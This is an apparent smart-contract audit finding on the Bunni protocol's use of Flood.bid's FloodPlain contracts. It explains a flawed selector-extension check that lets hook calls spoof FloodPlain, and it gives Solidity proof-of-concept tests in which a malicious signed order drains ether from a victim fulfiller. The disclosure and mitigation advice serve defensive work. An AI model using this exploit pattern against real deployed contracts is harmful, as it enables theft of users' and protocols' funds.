---
tags:
  - severity/high
  - has/github
  - lang/solidity
  - sector/token
  - platform/cyfrin
protocol: "[[Bunni]]"
auditors:
  - Draiakoo
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-10-cyfrin-bunni-v2.1.md"
genome:
  - "[[reentrancy-guard]]"
  - "[[flashloan-callback-auth]]"
  - "[[reentrancy/cross-function]]"
  - "[[loss-of-funds/direct-drain]]"
  - "[[known-pattern]]"
  - "[[reentrancy-callback]]"
  - "[[use-reentrancy-guard]]"
  - "[[precondition/always]]"
  - "[[blast-radius/single-user]]"
---
# `FloodPlain` selector extension does not prevent `IFulfiller::sourceConsideration` callback from being called within pre/post hooks

- id: 56966
- impact: HIGH
- protocol: Bunni
- reporter: Draiakoo (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-10-cyfrin-bunni-v2.1.md

## Summary


This bug report discusses an issue with the `FloodPlain` contracts that can potentially allow malicious actors to spoof the `FloodPlain` address and make unauthorized external calls during the execution of pre/post hooks. The issue is caused by the `SELECTOR_EXTENSION` constant, which is not actually a hashed function signature and only prevents calls to the `IFulfiller::sourceConsiderations` interface, not the `IFulfiller::sourceConsideration` interface. This can lead to dangling approvals that can be later exploited. The report provides a proof of concept and a recommended mitigation to address the issue. The 0x team has acknowledged the issue and plans to fix it in the future, while other teams have acknowledged it and will address it in their contracts.

## Details

**Description:** The `FloodPlain` contracts implement a check in `Hooks::execute` which intends to prevent spoofing by invoking the fulfiller callback during execution of the pre/post hooks:

```solidity
    bytes28 constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));

    library Hooks {
        function execute(IFloodPlain.Hook calldata hook, bytes32 orderHash, address permit2) internal {
            address target = hook.target;
            bytes calldata data = hook.data;

            bytes28 extension; // @audit - an attacker can control this value to pass the below check
            assembly ("memory-safe") {
                extension := shl(32, calldataload(data.offset)) // @audit - this shifts off the first 4 bytes of the calldata, which is the `sourceConsideration()` function selector. thus preventing a call to either `sourceConsideration()` or `sourceConsiderations()` relies on the fulfiller requiring the `selectorExtension` argument to be `SELECTOR_EXTENSION`
            }
@>          require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");

            assembly ("memory-safe") {
                let fmp := mload(0x40)
                calldatacopy(fmp, data.offset, data.length)
                mstore(add(fmp, data.length), orderHash)
                if iszero(call(gas(), target, 0, fmp, add(data.length, 32), 0, 0)) {
                    returndatacopy(0, 0, returndatasize())
                    revert(0, returndatasize())
                }
            }
        }
        ...
    }
```

However, the `SELECTOR_EXTENSION` constant simply acts as a sort of "magic value" as it does not actually contain the hashed function signature. As such, assuming fulfillers validate selector extension argument against this expected value, this only prevent calls using the `IFulfiller::sourceConsiderations` interface and not `IFulfiller.sourceConsideration`. Therefore, a malicious Flood order can be fulfilled and used to target a victim fulfiller by executing the arbitrary external call during the pre/post hooks. If the caller is not explicitly validated, then it is possible that this call will be accepted by the fulfiller and potentially result in dangling approvals that can be later exploited. Additionally, this same selector extension is passed to the `IFulfiller::sourceConsideration` callback in both overloaded versions of `FloodPlain::fulfillOrder` when this should ostensibly be `bytes28(keccak256("IFulfiller.sourceConsideration"))`.

While the code is not currently public, this is the case for the Bunni rebalancer that simply only checks that `msg.sender` is the Flood contract and ignores the`selectorExtension` and `caller` parameters. As a result, it can be tricked into decoding an attacker-controlled address to which an infinite approval is made for the offer token. The malicious Flood order can freely control both the Flood order and accompanying context, meaning that they can drain any token inventory held by the rebalancer.

**Impact:** Malicious Flood orders can spoof the `FloodPlain` address by invoking the `IFulfiller::sourceConsideration` callback during execution of the pre/post hooks.

**Proof of Concept:** The following test can be added to the Flood.bid library tests in `Hooks.t.sol`:

```solidity
function test_RevertWhenSelectorExtensionClashSourceConsideration(
        bytes4 data0,
        bytes calldata data2,
        bytes32 orderHash,
        address permit2
    ) public {
        vm.assume(permit2 != hooked);
        bytes28 data1 = bytes28(keccak256("IFulfiller.sourceConsideration")); // note the absence of the final 's'
        bytes memory data = abi.encodePacked(data0, data1, data2);

        // this actually succeeds, so it is possible to call sourceConsideration on the fulfiller from the hook
        // with FloodPlain as the sender and any arbitrary caller before the consideration is actually sourced
        // which can be used to steal approvals from other contracts that integrate with FloodPlain
        hookHelper.execute(IFloodPlain.Hook({target: address(0x6969696969), data: data}), orderHash, permit2);
    }
```

And the standalone test file below demonstrates the full end-to-end issue:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "test/utils/FloodPlainTestShared.sol";

import {PermitHash} from "permit2/src/libraries/PermitHash.sol";
import {OrderHash} from "src/libraries/OrderHash.sol";

import {IFloodPlain} from "src/interfaces/IFloodPlain.sol";
import {IFulfiller} from "src/interfaces/IFulfiller.sol";
import {SELECTOR_EXTENSION} from "src/libraries/Hooks.sol";

import {IERC20, SafeERC20} from "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {Address} from "@openzeppelin/utils/Address.sol";

contract ThirdPartyFulfiller is IFulfiller {
    using SafeERC20 for IERC20;
    using Address for address payable;

    function sourceConsideration(
        bytes28 selectorExtension,
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256) {
        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")));

        IFloodPlain.Item calldata item = order.consideration;
        if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
        else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);

        return item.amount;
    }

    function sourceConsiderations(
        bytes28 selectorExtension,
        IFloodPlain.Order[] calldata orders,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256[] memory amounts) {
        require(selectorExtension == SELECTOR_EXTENSION);

        uint256[] memory amounts = new uint256[](orders.length);

        for (uint256 i; i < orders.length; ++i) {
            IFloodPlain.Order calldata order = orders[i];
            IFloodPlain.Item calldata item = order.consideration;
            amounts[i] = item.amount;
            if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
            else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
        }
    }
}

contract FloodPlainPoC is FloodPlainTestShared {
    IFulfiller victimFulfiller;

    function setUp() public override {
        super.setUp();
        victimFulfiller = new ThirdPartyFulfiller();
    }

    function test_FraudulentPreHookSourceConsideration() public {
        // create a malicious order that will call out to a third-party fulfiller in the pre hook
        // just copied the setup_mostBasicOrder logic for simplicity but this can be a fake order with fake tokens
        // since it is only the pre hook execution that is interesting here

        deal(address(token0), account0.addr, token0.balanceOf(account0.addr) + 500);
        deal(address(token1), address(fulfiller), token1.balanceOf(address(fulfiller)) + 500);
        IFloodPlain.Item[] memory offer = new IFloodPlain.Item[](1);
        offer[0].token = address(token0);
        offer[0].amount = 500;
        uint256 existingAllowance = token0.allowance(account0.addr, address(permit2));
        vm.prank(account0.addr);
        token0.approve(address(permit2), existingAllowance + 500);
        IFloodPlain.Item memory consideration;
        consideration.token = address(token1);
        consideration.amount = 500;

        // fund the victim fulfiller with native tokens that we will have it transfer out as the "consideration"
        uint256 targetAmount = 10 ether;
        deal(address(victimFulfiller), targetAmount);
        assertEq(address(victimFulfiller).balance, targetAmount);

        IFloodPlain.Item memory evilConsideration;
        evilConsideration.token = address(0);
        evilConsideration.amount = targetAmount;

        // now set up the spoofed sourceConsideration call (note the offer doesn't matter as this is not a legitimate order)
        IFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);
        IFloodPlain.Order memory maliciousOrder = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: evilConsideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: new IFloodPlain.Hook[](0),
            postHooks: new IFloodPlain.Hook[](0)
        });
        preHooks[0] = IFloodPlain.Hook({
            target: address(victimFulfiller),
            data: abi.encodeWithSelector(IFulfiller.sourceConsideration.selector, bytes28(keccak256("IFulfiller.sourceConsideration")), maliciousOrder, address(0), bytes(""))
        });

        // Construct the fraudulent order.
        IFloodPlain.Order memory order = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: consideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: preHooks,
            postHooks: new IFloodPlain.Hook[](0)
        });

        // Sign the order.
        bytes memory sig = getSignature(order, account0);

        IFloodPlain.SignedOrder memory signedOrder = IFloodPlain.SignedOrder({order: order, signature: sig});

        deal(address(token1), address(this), 500);
        token1.approve(address(book), 500);

        // Filling order succeeds and pre hook call invoked sourceConsideration on the vitim fulfiller.
        book.fulfillOrder(signedOrder);
        assertEq(address(victimFulfiller).balance, 0);
    }
}
```

**Recommended Mitigation:** Following the [recent acquisition](https://0x.org/post/0x-acquires-flood-to-optimize-trade-execution) of Flood.bid by 0x, it appears that these contracts are no longer maintained. Therefore, without requiring an upstream change, this issue can be mitigated by always validating the `selectorExtension` argument is equal to the `SELECTOR_EXTENSION` constant in the implementation of both `IFulfiller::sourceConsideration` and `IFulfiller::sourceConsiderations`.

**0x:**
The actual value of `SELECTOR_EXTENSION` is unfortunate but the intent of the code is respected and safe, and its expected for Fulfillers to be the "expert" actors in the system and handle their security well.

**Bacon Labs:** Acknowledged and will fix this later in our rebalancer contract. Realistically there’s currently no impact since our rebalancer does not hold any inventory other than during the execution of an order.

**Cyfrin:** Acknowledged.

\clearpage
